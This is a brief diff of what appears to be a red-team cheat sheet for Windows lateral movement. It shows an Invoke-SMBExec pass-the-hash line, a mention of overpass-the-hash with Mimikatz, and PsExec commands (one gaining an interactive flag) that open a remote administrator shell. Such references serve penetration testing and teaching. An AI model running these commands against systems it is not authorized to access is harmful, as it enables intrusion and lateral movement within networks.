@@ -111,7 +111,7 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 #### Psexec
 - Seems to only work with password or after a overpass the hash attack with Mimikatz!
 ```
-.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> cmd.exe
+.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> -i cmd.exe
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula 
 ```
 
